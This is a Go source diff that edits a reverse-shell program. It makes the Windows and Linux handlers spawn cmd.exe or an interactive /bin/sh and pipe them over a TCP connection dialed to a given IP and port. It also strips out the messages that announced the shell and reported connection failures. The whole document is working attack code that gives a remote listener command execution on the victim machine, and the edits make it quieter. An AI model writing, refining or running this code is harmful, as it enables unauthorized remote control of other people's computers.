@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"net"
 	"os/exec"
 	"runtime"
@@ -24,33 +25,34 @@ func getShell() func(net.Conn) {
 }
 
 func _shellWindows(conn net.Conn) {
-	c := exec.Command("cmd")
+	c := exec.Command("cmd.exe")
+	rp, wp := io.Pipe()
 	c.Stdin = conn
-	c.Stdout = conn
+	c.Stdout = wp
+	go io.Copy(conn, rp)
 	c.Stderr = conn
 	c.Run()
+	conn.Close()
 }
 
 func _shellLinux(conn net.Conn) {
-	c := exec.Command("/bin/sh")
+	c := exec.Command("/bin/sh", "-i")
+	rp, wp := io.Pipe()
 	c.Stdin = conn
-	c.Stdout = conn
+	c.Stdout = wp
+	go io.Copy(conn, rp)
 	c.Stderr = conn
 	c.Run()
+	conn.Close()
 }
 
 func reverseShell(ip string, port string, wg *sync.WaitGroup) {
-	fmt.Println("Creating Reverse Shell")
-
-	// Handle waitgroup
 	defer wg.Done()
 
 	c, err := net.Dial("tcp", ip+":"+port)
 	if err != nil {
-		fmt.Println("Unable to create reverse shell to:", ip+":"+port)
 		return
 	}
-
 	wg.Add(1)
 	go shell(c, wg)
 }
